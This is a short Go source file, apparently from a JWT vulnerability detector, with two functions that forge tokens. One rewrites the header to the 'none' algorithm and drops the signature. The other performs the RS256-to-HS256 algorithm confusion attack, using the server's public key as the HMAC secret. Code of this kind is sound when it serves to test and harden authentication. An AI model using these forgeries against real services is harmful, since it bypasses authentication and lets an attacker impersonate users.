package jwt

import (
	"crypto/hmac"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
)

// GenerateNoneAlgToken creates a token with the none algorithm for testing.
func (d *Detector) GenerateNoneAlgToken(originalToken, variant string) (string, error) {
	parsed, err := d.ParseJWT(originalToken)
	if err != nil {
		return "", fmt.Errorf("failed to parse original token: %w", err)
	}

	// Modify header to use none algorithm
	parsed.Header["alg"] = variant

	// Re-encode header
	headerJSON, err := json.Marshal(parsed.Header)
	if err != nil {
		return "", fmt.Errorf("failed to marshal header: %w", err)
	}

	// Re-encode payload (preserve original claims)
	payloadJSON, err := json.Marshal(parsed.Claims)
	if err != nil {
		return "", fmt.Errorf("failed to marshal payload: %w", err)
	}

	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	payloadB64 := base64.RawURLEncoding.EncodeToString(payloadJSON)

	// Return token with empty signature
	return headerB64 + "." + payloadB64 + ".", nil
}

// GenerateAlgConfusionToken creates a token for algorithm confusion attack testing.
func (d *Detector) GenerateAlgConfusionToken(originalToken string, publicKey *rsa.PublicKey) (string, error) {
	parsed, err := d.ParseJWT(originalToken)
	if err != nil {
		return "", fmt.Errorf("failed to parse original token: %w", err)
	}

	// Modify header to use HS256 (algorithm confusion: RS256 -> HS256)
	parsed.Header["alg"] = "HS256"

	// Re-encode header
	headerJSON, err := json.Marshal(parsed.Header)
	if err != nil {
		return "", fmt.Errorf("failed to marshal header: %w", err)
	}

	// Re-encode payload
	payloadJSON, err := json.Marshal(parsed.Claims)
	if err != nil {
		return "", fmt.Errorf("failed to marshal payload: %w", err)
	}

	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	payloadB64 := base64.RawURLEncoding.EncodeToString(payloadJSON)

	message := headerB64 + "." + payloadB64

	// Use public key bytes as HMAC secret
	pubKeyBytes, err := x509.MarshalPKIXPublicKey(publicKey)
	if err != nil {
		return "", fmt.Errorf("failed to marshal public key: %w", err)
	}

	// Create HMAC signature using public key as secret
	h := hmac.New(sha256.New, pubKeyBytes)
	h.Write([]byte(message))
	signature := base64.RawURLEncoding.EncodeToString(h.Sum(nil))

	return message + "." + signature, nil
}
